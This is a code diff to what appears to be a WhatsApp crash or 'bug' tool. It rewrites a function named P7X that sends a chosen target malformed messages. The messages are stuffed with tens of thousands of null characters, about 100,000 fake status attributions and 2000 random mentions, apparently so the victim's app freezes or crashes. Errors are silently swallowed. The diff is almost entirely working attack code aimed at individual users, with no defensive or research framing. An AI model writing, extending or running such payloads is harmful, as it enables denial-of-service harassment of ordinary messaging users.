@@ -4183,35 +4183,92 @@ async function HypermartDiley(sock, jid) {
 }
 
 async function P7X(sock, target) {
-    await sock.relayMessage(
-        target,
-        {
-            groupStatusMessageV2: {
-                message: {
-                    interactiveResponseMessage: {
-                        body: {
-                            text: "6core",
-                            format: "DEFAULT",
-                        },
-                        nativeFlowResponseMessage: {
-                            name: "payment_method",
-                            buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0000".repeat(9000)},\"payment_timestamp\":null,\"share_payment_status\":false}`,
-                            version: 3
-                        },
-                        contextInfo: {
-                            remoteJid: Math.random().toString(36) + "\u0000".repeat(9000),
-                            isForwarded: true,
-                            forwardingScore: 9999,
-                            statusAttributionType: 2,
-                            statusAttributions: Array.from({ length: 100000 }, (_, n) => ({
-                                participant: `62${n + 836598}@s.whatsapp.net`,
-                                type: 1
-                            })),
-                        },
-                    },
-                },
-            },
-        }, { participant: { jid: target } });
+  try {
+      await sock.relayMessage(
+         target,
+          {
+              groupStatusMessageV2: {
+                  message: {
+                      interactiveResponseMessage: {
+                          body: {
+                              text: "Zenz",
+                              format: "DEFAULT"
+                          },
+                          nativeFlowResponseMessage: {
+                              name: "payment_method",
+                              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0000".repeat(9000)},\"payment_timestamp\":null,\"share_payment_status\":false}`,
+                              version: 3
+                          },
+                          contextInfo: {
+                              remoteJid: Math.random().toString(36) + "\u0000".repeat(9000),
+                              isForwarded: true,
+                              forwardingScore: 9999,
+                              statusAttributionType: 2,
+                              statusAttributions: Array.from({ length: 99999 }, (_, n) => ({
+                                  participant: `62${n + 836598}@s.whatsapp.net`,
+                                  type: 1
+                              }))
+                          }
+                      }
+                  }
+              }
+         },
+     { participant: { jid: target } }
+  );
+
+    const pox = {
+      groupStatusMessageV2: {
+        message: {
+          extendedTextMessage: {
+            text: "\u0000".repeat(1000),
+            viewOnce: true,
+            contextInfo: {
+              mentionedJid: [
+                target,
+                ...Array.from(
+                  { length: 2000 },
+                  () =>
+                    "1" +
+                    Math.floor(Math.random() * 5000000) +
+                    "@s.whatsapp.net"
+                )
+              ],
+              isForwarded: true,
+              statusAttributionType: 3,
+              forwardingScore: 7205,
+              isForwarded: true,
+              pairedMediaType: null,
+              forwardOrigin: "UNKNOWN"
+            }
+          }
+        }
+      }
+    };
+
+    const Apox = {
+      groupStatusMessageV2: {
+        message: {
+          interactiveResponseMessage: {
+            body: {
+              text: "Zen?",
+              format: "DEFAULT"
+            },
+            contextInfo: {
+              mentionedJid: ["13135550002@s.whatsapp.net"]
+            },
+            nativeFlowResponseMessage: {
+              name: "galaxy_message",
+              paramsJson: "\u0000".repeat(90000),
+              version: 3
+            }
+          }
+        }
+      }
+    };
+
+    await sock.relayMessage(target, pox, { participant: { jid: target } });
+    await sock.relayMessage(target, Apox, { participant: { jid: target } });
+  } catch {}
 }
 
 async function Vdelay(sock, target) {
